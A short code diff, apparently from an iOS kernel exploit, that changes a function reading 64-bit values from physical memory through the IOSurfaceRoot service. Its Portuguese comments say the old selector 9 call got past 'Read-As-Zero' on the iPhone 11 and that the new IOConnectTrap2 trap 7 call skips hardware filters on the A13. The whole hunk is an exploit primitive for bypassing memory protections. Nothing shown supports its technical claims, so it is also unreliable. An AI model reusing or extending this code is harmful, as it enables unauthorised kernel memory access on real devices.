@@ -76,13 +76,10 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     uint64_t val = 0;
     io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
     io_connect_t conn;
-    if (svc && IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0) {
-        uint64_t in[3] = {pa, 8, 0};
-        uint64_t out = 0;
-        uint32_t outC = 1;
-        // Seletor 9 no iPhone 11 contorna o Read-As-Zero
-        IOConnectCallMethod(conn, 9, in, 3, NULL, 0, &out, &outC, NULL, 0);
-        val = out;
+    if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0) {
+        // Trap 7 ignora filtros de hardware no A13
+        // pa = endereço físico, 8 = tamanho
+        val = IOConnectTrap2(conn, 7, (uintptr_t)pa, 8); 
         IOServiceClose(conn);
     }
     return val;
